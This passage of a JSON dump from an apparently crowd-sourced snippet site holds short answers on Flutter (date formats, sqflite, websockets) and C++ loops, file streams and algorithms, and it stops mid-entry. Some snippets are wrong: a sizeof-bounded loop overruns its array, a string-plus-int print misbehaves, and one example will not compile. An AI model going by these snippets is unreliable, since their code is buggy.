    "description": "import 'package:intl/intl.dart';  DateTime now = DateTime.now(); String formattedDate = DateFormat('yyyy-MM-dd &ndash; kk:mm').format(now);\n ICU Name                   Skeleton  --------                   --------  DAY                          d  ABBR_WEEKDAY                 E  WEEKDAY                      EEEE  ABBR_STANDALONE_MONTH        LLL  STANDALONE_MONTH             LLLL  NUM_MONTH                    M  NUM_MONTH_DAY                Md  NUM_MONTH_WEEKDAY_DAY        MEd  ABBR_MONTH                   MMM  ABBR_MONTH_DAY               MMMd  ABBR_MONTH_WEEKDAY_DAY       MMMEd  MONTH                        MMMM  MONTH_DAY                    MMMMd  MONTH_WEEKDAY_DAY            MMMMEEEEd  ABBR_QUARTER                 QQQ  QUARTER                      QQQQ  YEAR                         y  YEAR_NUM_MONTH               yM  YEAR_NUM_MONTH_DAY           yMd  YEAR_NUM_MONTH_WEEKDAY_DAY   yMEd  YEAR_ABBR_MONTH              yMMM  YEAR_ABBR_MONTH_DAY          yMMMd  YEAR_ABBR_MONTH_WEEKDAY_DAY  yMMMEd  YEAR_MONTH                   yMMMM  YEAR_MONTH_DAY               yMMMMd  YEAR_MONTH_WEEKDAY_DAY       yMMMMEEEEd  YEAR_ABBR_QUARTER            yQQQ  YEAR_QUARTER                 yQQQQ  HOUR24                       H  HOUR24_MINUTE                Hm  HOUR24_MINUTE_SECOND         Hms  HOUR                         j  HOUR_MINUTE                  jm  HOUR_MINUTE_SECOND           jms  HOUR_MINUTE_GENERIC_TZ       jmv  HOUR_MINUTE_TZ               jmz  HOUR_GENERIC_TZ              jv  HOUR_TZ                      jz  MINUTE                       m  MINUTE_SECOND                ms  SECOND                       s \n  @override   void initState() {     super.initState();     initializeDateFormatting();   } \nimport 'package:intl/intl.dart';\n dart pub add intl\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2083,
    "keyword": null,
    "link": null,
    "title": " flutter margins",
    "description": "Container ( \t// Even Margin On All Sides     margin: EdgeInsets.all(10.0),     // Symetric Margin     margin: EdgeInsets.symmetric(vertical: 10.0, horizontal: 5.0),     // Different Margin For All Sides     margin: EdgeInsets.fromLTRB(1.0, 2.0, 3.0, 4.0);          child: Child     (     \t...     ), )\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2084,
    "keyword": null,
    "link": null,
    "title": " flutter run specific device",
    "description": "flutter run -d iPhone 6 \n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2085,
    "keyword": null,
    "link": null,
    "title": " flutter sqflite",
    "description": "dependencies:   ... \tsqflite: ^2.0.0+3 \n// Get a location using getDatabasesPath var databasesPath = await getDatabasesPath(); String path = join(databasesPath, 'demo.db');  // Delete the database await deleteDatabase(path);  // open the database Database database = await openDatabase(path, version: 1,     onCreate: (Database db, int version) async {   // When creating the db, create the table   await db.execute(       'CREATE TABLE Test (id INTEGER PRIMARY KEY, name TEXT, value INTEGER, num REAL)'); });  // Insert some records in a transaction await database.transaction((txn) async {   int id1 = await txn.rawInsert(       'INSERT INTO Test(name, value, num) VALUES(\"some name\", 1234, 456.789)');   print('inserted1: $id1');   int id2 = await txn.rawInsert(       'INSERT INTO Test(name, value, num) VALUES(?, ?, ?)',       ['another name', 12345678, 3.1416]);   print('inserted2: $id2'); });  // Update some record int count = await database.rawUpdate(     'UPDATE Test SET name = ?, value = ? WHERE name = ?',     ['updated name', '9876', 'some name']); print('updated: $count');  // Get the records List<Map> list = await database.rawQuery('SELECT * FROM Test'); List<Map> expectedList = [   {'name': 'updated name', 'id': 1, 'value': 9876, 'num': 456.789},   {'name': 'another name', 'id': 2, 'value': 12345678, 'num': 3.1416} ]; print(list); print(expectedList); assert(const DeepCollectionEquality().equals(list, expectedList));  // Count the records count = Sqflite     .firstIntValue(await database.rawQuery('SELECT COUNT(*) FROM Test')); assert(count == 2);  // Delete a record count = await database     .rawDelete('DELETE FROM Test WHERE name = ?', ['another name']); assert(count == 1);  // Close the database await database.close(); \nimport 'package:sqflite/sqflite.dart'; \n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2086,
    "keyword": null,
    "link": null,
    "title": " flutter text direction auto",
    "description": "import 'package:intl/intl.dart' as intl;  bool isRTL(String text) {     return intl.Bidi.detectRtlDirectionality(text); }\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2087,
    "keyword": null,
    "link": null,
    "title": " flutter websocket auto reconnect",
    "description": "  wserror(err) async {     print(new DateTime.now().toString() + \" Connection error: $err\");     await reconnect();   }   reconnect() async {     if (_channel != null) {       // add in a reconnect delay       await Future.delayed(Duration(seconds: 4));     }     setState(() {       print(new DateTime.now().toString() + \" Starting connection attempt...\");       _channel = IOWebSocketChannel.connect(wsUrl);       print(new DateTime.now().toString() + \" Connection attempt completed.\");     });     _channel.stream.listen((data) => processMessage(data), onDone: reconnect, onError: wserror, cancelOnError: true);   }\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2088,
    "keyword": null,
    "link": null,
    "title": " fname from FString",
    "description": "FString TheString; FName TheName = FName(*TheString);\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2089,
    "keyword": null,
    "link": null,
    "title": " foo foo little dogs",
    "description": "Yes I googled it too \n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2090,
    "keyword": null,
    "link": null,
    "title": " footnote appears in the middle latex",
    "description": "\\usepackage[bottom]{footmisc}\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2091,
    "keyword": null,
    "link": null,
    "title": " for c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\nfor(int i=0; i<=limit; i++) { \t//statement }\n for (int i=0; i<10; ++i);  \n#include <iostream> #include <stdlib.h>  /*==================================== *           eXcript.com *          fb.com/eXcript * ====================================*/  using namespace std;  int main() {     for(int i = 0; i <= 10; i++){         cout << \"O valor de i eh igual: \" << i << endl;     }      system(\"pause\");     return 0; } \n#include <iostream> #include <string> using namespace std;   int main()  {   cout<<\"Printing 2's multiples less than 20\"<<endl;   for(int i =2;i<=20;i +=2)    {cout<<\"i = \"<<i<<\"\\t\";    }  } \nfor (int i = 0; i < 7; i++) { \tcout << i << endl; }\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2092,
    "keyword": null,
    "link": null,
    "title": " for each c++",
    "description": "// for_each example #include <iostream>     // std::cout #include <algorithm>    // std::for_each #include <vector>       // std::vector  void myfunction (int i) {  // function:   std::cout << ' ' << i; }  struct myclass {           // function object type:   void operator() (int i) {std::cout << ' ' << i;} } myobject;  int main () {   std::vector<int> myvector;   myvector.push_back(10);   myvector.push_back(20);   myvector.push_back(30);    std::cout << \"myvector contains:\";   for_each (myvector.begin(), myvector.end(), myfunction);   std::cout << '\\n';    // or:   std::cout << \"myvector contains:\";   for_each (myvector.begin(), myvector.end(), myobject);   std::cout << '\\n';    return 0; }\nfor_each( InputIt first, InputIt last, UnaryFunction f ); //Example vector<int> v{ 1, 2, 3, 4, 5 }; for_each(v.begin(), v.end(), [](int i) { cout<<i<<\" \"<<endl; }); \ntemplate<class InputIterator, class Function>   Function for_each(InputIterator first, InputIterator last, Function fn) {   while (first!=last) {     fn (*first);     ++first;   }   return fn;      // or, since C++11: return move(fn); }\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2093,
    "keyword": null,
    "link": null,
    "title": " for loop",
    "description": "#!/bin/bash for (( c=1; c<=5; c++ )) do      echo \"Welcome $c times\" done \nfor (int i = 1; i <= 10; i++) { \tprintf(\"%d\\n\",i); }\nfor(int i = 0; i < some_number; i++){   \t//inside loop do whatever you want }\n// this is javascript, but can be used in any language  // with minor modifications of variable definitions  let array = [\"foo\", \"bar\"]  let low = 0; // the index to start at let high = array.length; // can also be a number  /* high can be a direct access too \tthe first part will be executed when the loop starts      \tfor the first time \tthe second part (\"i < high\") is the condition      \tfor it to loop over again.     the third part will be executen every time the code          block in the loop is closed. */  for(let i = low; i < high; i++) {    // the variable i is the index, which is   // the amount of times the loop has looped already   console.log(i);   console.log(array[i]);  } // i will be incremented when this is hit.  // output:  /* \t0     foo     1     bar */\nfruits = ['apple', 'orange', 'peach']  for fruit in fruits:   print(fruit)\nfor i in range (some_number): \t#code goes here\nfor (let i = 0; i < substr.length; ++i) {     // do something with `substr[i]` } \nFor Loop A for loop is a repetition control structure that allows you to efficiently write a loop that needs to be executed a specific number of times. A for loop is useful when you know how many times a task is to be repeated. Syntax :  for(initialization; Boolean_expression; update) {    // Statements } This is how it works :   The initialization step is executed first, and only once. This step allows you to declare and initialize any loop control variables and this step ends with a semi colon (;). Next, the Boolean expression is evaluated.  If it is true, the body of the loop is executed. If it is false, the body of the loop will not be executed and control jumps to the next statement past the for loop. After the body of the for loop gets executed, the control jumps back up to the update statement. This statement allows you to update any loop control variables. This statement can be left blank with a semicolon at the end. The Boolean expression is now evaluated again. If it is true, the loop executes and the process repeats (body of loop, then update step, then Boolean expression).  After the Boolean expression is false, the for loop terminates.\n// Unity for loop coroutine (repeat something every x seconds for x time)  Coroutine doThisCoroutine; // (Create a coroutine for stopping) int duration = 5 // (Duration, whatever you want it to be) float waitTime = 1 // Wait time to iterate in seconds, usually 1  void Awake(){      DoThisCoroutine = StartCoroutine(DoThis()); // Start the coroutine      }      IEnumerator DoThis(){      while (enabled){ // While the behavior is enabled,        for (int x = 0; x < Duration; x++){ // From zero until 5 incrementing by 1...            print(\"Doing This!\"); // Do whatever...   \t       yield return new WaitForSeconds(waitTime) // Every second.      \t}      }  }     \nfor( initialize; test; increment or decrement)  {  //code;  //code;  }\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2094,
    "keyword": null,
    "link": null,
    "title": " for loop c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\n#include <iostream>  using namespace std;  int main(){     int i; //initialize integer   //i starts at 0 and stops at 4, as 5 is not < 5   for (i = 0; i < 5; i++){ //i++ means add 1 to i each iteration     cout << \"number \" + i << endl; //print 5 times   }   return 0; } //output: /* number 0 number 1 number 2 number 3 number 4 */\nfor (/* init var */;/* break condition */;/* mathmatic operation */) {   // do something }\nfor(initialization; condition ; increment/decrement) {    statement(s); }\n",
    "reg_date": "2021-10-12T11:40:15.000Z"
  },
  {
    "id": 2095,
    "keyword": null,
    "link": null,
    "title": " for loop f#",
    "description": "/* \tfor( declartion ; question ; operation ) \tthe semi-colon(;) is a must but the declation, question and opertion is not  \tthe declation question and operation can be swaped to your liking  \tand even removed completly */ // examples:  for(int i = 0; i < 3; i++)  // output: {\t\t\t\t\t\t\t//\tHi   Console.WriteLine(\"Hi\");\t//\tHi }\t\t\t\t\t\t\t//\tHi for(int i = 0; i < 3; i++)  // output: {\t\t\t\t\t\t\t//\t0   Console.WriteLine(i);\t\t//\t1 }\t\t\t\t\t\t\t//\t2 // pay attention to this question it's <= instead of < for(int i = 5; i <= 8; i++)  // output: {\t\t\t\t\t\t\t//\t5   Console.WriteLine(i);\t\t//\t6 }\t\t\t\t\t\t\t//\t7 \t\t\t\t\t\t\t// \t8 for(int i = 3; i > 0; i--)  // output: {\t\t\t\t\t\t\t//\t3   Console.WriteLine(i);\t\t//\t2 }\t\t\t\t\t\t\t//\t1 for(;;) // this will result in an infinite loop {  \t// code here }\nfor (int i = 0; i < 10; i++) {     Console.WriteLine(\"Value of i: {0}\", i); }\n//int i = 0  --  Making variable i //i <=10     --  Making a condition for the loop to keep going //i++        --  Increasing i by 1  for(int i = 0; i <= 10; i++)   {     Console.Write(i+1);   } /* Output: 12345678910 */\nfor (int i = 0; i < 4; i++) {  \tprint()        }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2096,
    "keyword": null,
    "link": null,
    "title": " for loop in c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\nfor ( int i = 0; i < 5; i++) {   cout << \"Hello\" << endl; } // prints hello 5 times. \nfor (int i = start; i < stop; i = i + step){     // statement 1     // statement 2     // etc }\nfor (<exp_1>; <exp_2>; <exp_3>){     // loop body }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2097,
    "keyword": null,
    "link": null,
    "title": " for loop in c++ hackerrank solution",
    "description": "#include<bits/stdc++.h> using namespace std; int main() {     int a,b;     string c[]={\"\",\"one\",\"two\",\"three\",\"four\",\"five\",\"six\",\"seven\",\"eight\",\"nine\"};     cin>>a>>b;     for(int i=a;i<=b;i++)         cout<<((i<=9)?c[i]:((i%2==0)?\"even\":\"odd\"))<<endl; }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2098,
    "keyword": null,
    "link": null,
    "title": " for loop in cpp",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\n   for (int i = 0; i < 10; i++){   //Do something as long as i is less than 10,    //In that case it will loop 10 times   //use break; to restart the loop whenever you want to cancel the loops.   cout << i;      //at the end, remember i will be increased by 1. }  //output 0123456789\nfor(int i=0;i<size;i++){}\n//limit can be any number //you can use any comparison operator  for(int iteration = 0; iteration < limit_number; iteration++) { \t//action in for loop }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2099,
    "keyword": null,
    "link": null,
    "title": " for loop reverse C++",
    "description": "// Using iterators for (auto it = s.crbegin() ; it != s.crend(); ++it) {   std::cout << *it; }  // Naive for (int i = s.size() - 1; i >= 0; i--) {   std::cout << s[i]; } \n...evil pets won \n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2100,
    "keyword": null,
    "link": null,
    "title": " for loop vector",
    "description": "    for (auto i = v.begin(); i != v.end(); i++)     {         std::cout << *i << endl;     }\nfor(auto const& value: a) {      /* std::cout << value; ... */ }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2101,
    "keyword": null,
    "link": null,
    "title": " for loop with 2 variables in c++",
    "description": "for (int x=0, y=0 ; x < 10 && y < 10 ; x++, y++) {     // Your code here }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2102,
    "keyword": null,
    "link": null,
    "title": " for loop with array c++",
    "description": "string texts[] = {\"Apple\", \"Banana\", \"Orange\"}; for( unsigned int a = 0; a < sizeof(texts); a = a + 1 ) {     cout << \"value of a: \" << texts[a] << endl; }\nfor (int i = 0; i < arr.size(); ++i){ //use if we explicitly need the value of i cout << i << \":\\t\" << arr[i] << endl; } for (int element : arr){ //modifying element will not affect the array cout << element << endl; } for (int &element : arr){ //modifying element will affect the array cout << element << endl; }\n#include <iostream> #include <array>  int main() { \tint aNumbers[] = { 0, 1, 2, 3, 4, 5 }; \tint count = 0;\t \t \tfor (int aNumber : aNumbers) \t{\t\t \t\tstd::cout << \"Element \"<< count << \" : \" << aNumber << std::endl; \t\tcount++; \t} }\nfor(int i = 0; i < 4; i++) {   cout << cars[i] << \"\\n\"; }\nint v[] = {1,2,3,4,5}; for (int n : v)   cout << n << endl; //make sure to compile with -std=c++11\n/*sizeof(array_scores) is a pointer to array_scores[],  and has to be divided by each first-object[0]*/ for(int a = 0; a < sizeof(array_scores)/sizeof(array_scores[0]); a = a + 1 ){ \tcout << \"for loop, a = \" << array_scores[a] << \" at position \" << a << \"\\n\"; } //https://stackoverflow.com/questions/20234898/correct-way-of-looping-through-c-arrays\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2103,
    "keyword": null,
    "link": null,
    "title": " for statement in c++",
    "description": "#include iostream using namespace std;  int main{   for(int i=0; i<100; i++)   {     cout<<\"Hello World\";   }      return 0; }\n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2104,
    "keyword": null,
    "link": null,
    "title": " for vector c++",
    "description": "std::vector<int>::iterator it = vector.begin(); \nvector<int> vi; ... for(int i : vi)    cout << \"i = \" << i << endl; \nfor (auto it = begin (vector); it != end (vector); ++it) {     it->doSomething (); } \n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2105,
    "keyword": null,
    "link": null,
    "title": " ford fulkerson maximum flow",
    "description": "// C++ program for implementation of Ford Fulkerson // algorithm #include <iostream> #include <limits.h> #include <queue> #include <string.h> using namespace std;   // Number of vertices in given graph #define V 6   /* Returns true if there is a path from source 's' to sink   't' in residual graph. Also fills parent[] to store the   path */ bool bfs(int rGraph[V][V], int s, int t, int parent[]) {     // Create a visited array and mark all vertices as not     // visited     bool visited[V];     memset(visited, 0, sizeof(visited));       // Create a queue, enqueue source vertex and mark source     // vertex as visited     queue<int> q;     q.push(s);     visited[s] = true;     parent[s] = -1;       // Standard BFS Loop     while (!q.empty()) {         int u = q.front();         q.pop();           for (int v = 0; v < V; v++) {             if (visited[v] == false && rGraph[u][v] > 0) {                 // If we find a connection to the sink node,                 // then there is no point in BFS anymore We                 // just have to set its parent and can return                 // true                 if (v == t) {                     parent[v] = u;                     return true;                 }                 q.push(v);                 parent[v] = u;                 visited[v] = true;             }         }     }       // We didn't reach sink in BFS starting from source, so     // return false     return false; }   // Returns the maximum flow from s to t in the given graph int fordFulkerson(int graph[V][V], int s, int t) {     int u, v;       // Create a residual graph and fill the residual graph     // with given capacities in the original graph as     // residual capacities in residual graph     int rGraph[V]               [V]; // Residual graph where rGraph[i][j]                    // indicates residual capacity of edge                    // from i to j (if there is an edge. If                    // rGraph[i][j] is 0, then there is not)     for (u = 0; u < V; u++)         for (v = 0; v < V; v++)             rGraph[u][v] = graph[u][v];       int parent[V]; // This array is filled by BFS and to                    // store path       int max_flow = 0; // There is no flow initially       // Augment the flow while tere is path from source to     // sink     while (bfs(rGraph, s, t, parent)) {         // Find minimum residual capacity of the edges along         // the path filled by BFS. Or we can say find the         // maximum flow through the path found.         int path_flow = INT_MAX;         for (v = t; v != s; v = parent[v]) {             u = parent[v];             path_flow = min(path_flow, rGraph[u][v]);         }           // update residual capacities of the edges and         // reverse edges along the path         for (v = t; v != s; v = parent[v]) {             u = parent[v];             rGraph[u][v] -= path_flow;             rGraph[v][u] += path_flow;         }           // Add path flow to overall flow         max_flow += path_flow;     }       // Return the overall flow     return max_flow; }   // Driver program to test above functions int main() {     // Let us create a graph shown in the above example     int graph[V][V]         = { { 0, 16, 13, 0, 0, 0 }, { 0, 0, 10, 12, 0, 0 },             { 0, 4, 0, 0, 14, 0 },  { 0, 0, 9, 0, 0, 20 },             { 0, 0, 0, 7, 0, 4 },   { 0, 0, 0, 0, 0, 0 } };       cout << \"The maximum possible flow is \"          << fordFulkerson(graph, 0, 5);       return 0; } \n",
    "reg_date": "2021-10-12T11:40:16.000Z"
  },
  {
    "id": 2106,
    "keyword": null,
    "link": null,
    "title": " fork was not declared in this scope",
    "description": "#include <unistd.h>\n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2107,
    "keyword": null,
    "link": null,
    "title": " formal parameter c++",
    "description": "* formal parameter &mdash; the identifier used in a method to stand for the value that is passed into the method by a caller. For example, amount is a formal parameter of processDeposit. * actual parameter &mdash; the actual value that is passed into the method by a caller. \n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2108,
    "keyword": null,
    "link": null,
    "title": " format c++ discord",
    "description": "```c++ // Code here ```\n\tint GetTribePoints(int Tribe_Id) override \t{ \t\tint TribePoints; \t\ttry \t\t{ \t\t\tTribeDatabase << \"SELECT TribePoints FROM TribePoints WHERE TribeId = ?;\" << Tribe_Id >> TribePoints; \t\t\treturn TribePoints; \t\t} \t\tcatch (const sqlite::sqlite_exception& exception) \t\t{ \t\t\tLog::GetLog()->error(\"({} {}) Unexpected DB error 10{}\", __FILE__, __FUNCTION__, exception.what()); \t\t} \t}  \tbool SetTribePoints(int Tribe_Id,  int TribePoints) override \t{ \t\ttry \t\t{ \t\t\tTribeDatabase << \"UPDATE TribePoints SET TribePoints = ? WHERE TribeId = ?;\" << TribePoints << Tribe_Id; \t\t\treturn true; \t\t} \t\tcatch (const sqlite::sqlite_exception& exception) \t\t{ \t\t\tLog::GetLog()->error(\"({} {}) Unexpected DB error 11{}\", __FILE__, __FUNCTION__, exception.what()); \t\t\treturn false; \t\t} \t}\n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2109,
    "keyword": null,
    "link": null,
    "title": " format string cpp",
    "description": "#include <iostream> #include <format>   int main() {     std::cout << std::format(\"Hello {}!\\n\", \"world\"); }\n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2110,
    "keyword": null,
    "link": null,
    "title": " formats of constructor in c++",
    "description": "BigMommaClass {     BigMommaClass(int, int);  private:     ThingOne thingOne;     ThingTwo thingTwo; };  BigMommaClass::BigMommaClass(int numba1, int numba2): thingOne(numba1 + numba2), thingTwo(numba1, numba2) { // Code here }\nLine::Line( double len): length(len) {    cout << \"Object is being created, length = \" << len << endl; } \n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2111,
    "keyword": null,
    "link": null,
    "title": " forward list c++",
    "description": "forward_list(); explicit forward_list(const Allocator& Al); explicit forward_list(size_type Count); forward_list(size_type Count, const Type& Val); forward_list(size_type Count, const Type& Val, const Allocator& Al); forward_list(const forward_list& Right); forward_list(const forward_list& Right, const Allocator& Al); forward_list(forward_list&& Right); forward_list(forward_list&& Right, const Allocator& Al); forward_list(initializer_list<Type> IList, const Alloc& Al); template <class InputIterator> forward_list(InputIterator First, InputIterator Last); template <class InputIterator> forward_list(InputIterator First, InputIterator Last, const Allocator& Al); \n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2112,
    "keyword": null,
    "link": null,
    "title": " fractional knapsack problem",
    "description": "def greedy_knapsack(values,weights,capacity):     n = len(values)     def score(i) : return values[i]/weights[i]     items = sorted(range(n)  , key=score , reverse = True)     sel, value,weight = [],0,0     for i in items:         if weight +weights[i] <= capacity:             sel += [i]             weight += weights[i]             value += values [i]     return sel, value, weight   weights = [4,9,10,20,2,1] values = [400,1800,3500,4000,1000,200] capacity = 20  print(greedy_knapsack(values,weights,capacity))\n/*Given Weights and values of n items, we need to put these items in a knapsack   of capacity W to get the maximunm value in the knapsack.   Sample Input:N=3   \t\t\t   W=50;arr[]={{60,10},{100,20},{120,30}};   Sample Output:240   TC=O(nlogn) */ #include<bits/stdc++.h> using namespace std; struct item {     int value,weight; }; bool cmp(item a,item b) {     double r1=(double)a.value/a.weight;     double r2=(double)b.value/b.weight;     return(r1>r2); } double fractionalknapsack(item arr[],int w,int n) {     sort(arr,arr+n,cmp);     int cur_weight=0;     double final_val=0.0;     for(int i=0;i<n;i++)     {         if(cur_weight+arr[i].weight<=w)         {             cur_weight+=arr[i].weight;             final_val+=arr[i].value;         }         else         {             int remain=w-cur_weight;             final_val+=arr[i].value*((double)remain/arr[i].weight);         }     }     return final_val; } int main() {     int n;     cout<<\"Enter the number of items:\"<<endl;     cin>>n;     int w;     cout<<\"enter the maximum weight:\"<<endl;     cin>>w;     item arr[n];     cout<<\"enter the value and weights:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i].value>>arr[i].weight;     }     double ans=fractionalknapsack(arr,w,n);     cout<<ans;     return 0; } \n#include<bits/stdc++.h> using namespace std; vector<pair<int,int> >a; //dp table is full of zeros int n,s,dp[1002][1002]; void ini(){     for(int i=0;i<1002;i++)         for(int j=0;j<1002;j++)             dp[i][j]=-1; } int f(int x,int b){ \t//base solution \tif(x>=n or b<=0)return 0; \t//if we calculate this before, we just return the answer (value diferente of 0) \tif(dp[x][b]!=-1)return dp[x][b]; \t//calculate de answer for x (position) and b(empty space in knapsack) \t//we get max between take it or not and element, this gonna calculate all the \t//posible combinations, with dp we won't calculate what is already calculated. \treturn dp[x][b]=max(f(x+1,b),b-a[x].second>=0?f(x+1,b-a[x].second)+a[x].first:INT_MIN); } int main(){ \t//fast scan and print \tios_base::sync_with_stdio(0);cin.tie(0); \t//we obtain quantity of elements and size of knapsack \tcin>>n>>s; \ta.resize(n); \t//we get value of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].first; \t//we get size of elements \tfor(int i=0;i<n;i++) \t\tcin>>a[i].second; \t//initialize dp table \tini(); \t//print answer \tcout<<f(0,s); \treturn 0; } \n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2113,
    "keyword": null,
    "link": null,
    "title": " free a pointer c++",
    "description": "myPointer = new int; delete myPointer; //freed memory myPointer = NULL; //pointed dangling ptr to NULL \n",
    "reg_date": "2021-10-12T11:40:17.000Z"
  },
  {
    "id": 2114,
    "keyword": null,
    "link": null,
    "title": " free or delete in c++",
    "description": "delete --> If  you used the 'new' operator free --> If you used 'malloc'\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2115,
    "keyword": null,
    "link": null,
    "title": " free pair c++",
    "description": "foo contains: 90 and z \n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2116,
    "keyword": null,
    "link": null,
    "title": " friend function cpp reference",
    "description": "// friend functions #include <iostream> using namespace std;  class Rectangle {     int width, height;   public:     Rectangle() {}     Rectangle (int x, int y) : width(x), height(y) {}     int area() {return width * height;}     friend Rectangle duplicate (const Rectangle&); };  Rectangle duplicate (const Rectangle& param) {   Rectangle res;   res.width = param.width*2;   res.height = param.height*2;   return res; }  int main () {   Rectangle foo;   Rectangle bar (2,3);   foo = duplicate (bar);   cout << foo.area() << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2117,
    "keyword": null,
    "link": null,
    "title": " friend function in c++",
    "description": "// friend functions #include <iostream> using namespace std;  class Rectangle {     int width, height;   public:     Rectangle() {}     Rectangle (int x, int y) : width(x), height(y) {}     int area() {return width * height;}     friend Rectangle duplicate (const Rectangle&); };  Rectangle duplicate (const Rectangle& param) {   Rectangle res;   res.width = param.width*2;   res.height = param.height*2;   return res; }  int main () {   Rectangle foo;   Rectangle bar (2,3);   foo = duplicate (bar);   cout << foo.area() << '\\n';   return 0; }\nclass className{   // Other Declarations   friend returnType functionName(arg list); }; \n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2118,
    "keyword": null,
    "link": null,
    "title": " fstream in c++",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include<fstream> int main() {   fstream file;    /*if we use fstream then we need to specify at least one    parameter mode like ios::out or ios::in else the file will not open */     file.open(\"filename.txt\", ios::out|ios::in);   /*all work with file*/   file.close();   return 0; }\n// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \nofstream myfile; myfile.open(\"file.txt\");  myfile << \"write this to file\"\n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2119,
    "keyword": null,
    "link": null,
    "title": " fstream read write mode",
    "description": "#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n/ fstream::open / fstream::close #include <fstream>      // std::fstream  int main () {    std::fstream fs;   fs.open (\"test.txt\", std::fstream::in | std::fstream::out | std::fstream::app);    fs << \" more lorem ipsum\";    fs.close();    return 0; }\nstream file; file.open(fileName,ios::in | ios::out); \n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2120,
    "keyword": null,
    "link": null,
    "title": " funcion c++",
    "description": "int sum(int a, int b) {     return a + b; } \nint main() {     int i = sum(10, 32);     int j = sum(i, 66);     cout << \"The value of j is\" << j << endl; // 108 } \n",
    "reg_date": "2021-10-12T11:40:18.000Z"
  },
  {
    "id": 2121,
    "keyword": null,
    "link": null,
    "title": " function call in c++",
